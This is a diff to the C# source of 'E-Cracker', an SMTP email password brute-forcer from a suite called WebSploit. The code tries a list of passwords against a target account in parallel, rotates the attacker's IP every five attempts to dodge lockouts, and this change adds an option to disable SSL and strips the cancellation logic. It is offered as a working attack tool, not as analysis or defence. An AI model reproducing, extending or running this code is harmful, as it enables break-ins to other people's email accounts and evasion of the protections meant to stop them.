@@ -12,21 +12,16 @@ namespace EmailCracker
     class MainAttacker
     {
         static int temp_counter = 0;
-        public static void AttemptLogin(string smtp, int smtp_port, string target, string[] passwords, bool verbose)
+        public static void AttemptLogin(string smtp, int smtp_port, string target, string[] passwords, bool verbose, bool ssl)
         {
             SetupAttackEnv(target, smtp);
-            CancellationTokenSource cts = new CancellationTokenSource(); 
-            ParallelOptions options = new ParallelOptions 
-                             {CancellationToken = cts.Token};
             try
             {
-                Parallel.ForEach(passwords, options, (pass, state) => {
+                Parallel.ForEach(passwords, pass => {
                     if(temp_counter >= 5 && !IsLinux){
                         IPChanger.ChangeIP(verbose);
                         temp_counter = 0;
                     }
-                    if(options.CancellationToken.IsCancellationRequested)
-                        options.CancellationToken.ThrowIfCancellationRequested();
                     pass = pass.Trim();
                     SmtpClient client = new SmtpClient(smtp, smtp_port);
                     MailMessage mail = new MailMessage();
@@ -39,7 +34,8 @@ namespace EmailCracker
                     client.UseDefaultCredentials = false;
                     client.Credentials = new NetworkCredential(target, pass);
                     client.DeliveryMethod = SmtpDeliveryMethod.Network;
-                    client.EnableSsl = true;
+                    if(ssl)
+                        client.EnableSsl = true;
                     //client.Timeout = 30000;
 
                     if(client.Credentials != null)
@@ -53,7 +49,6 @@ namespace EmailCracker
                             Console.WriteLine("[VERBOSE] : Finishing child elements before returning...");
                             Environment.Exit(1);
                             Console.ForegroundColor = ConsoleColor.White;
-                            cts.Cancel();
                         }
                         catch(SmtpException ex)
                         {
@@ -101,7 +96,7 @@ namespace EmailCracker
             Console.ForegroundColor = ConsoleColor.Cyan;
             Console.WriteLine(Figgle.FiggleFonts.RedPhoenix.Render("E-Cracker"));
             Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine("Cracker v1.1 © 2021 MishDotCom");
+            Console.WriteLine("Cracker v1.2.1 © 2021 MishDotCom");
             Console.WriteLine("Part of the WebSploit suite.");
             Console.WriteLine("WebSploit > https://github.com/MishDotCom/WebSploit\n");
             Console.ForegroundColor = ConsoleColor.Yellow;
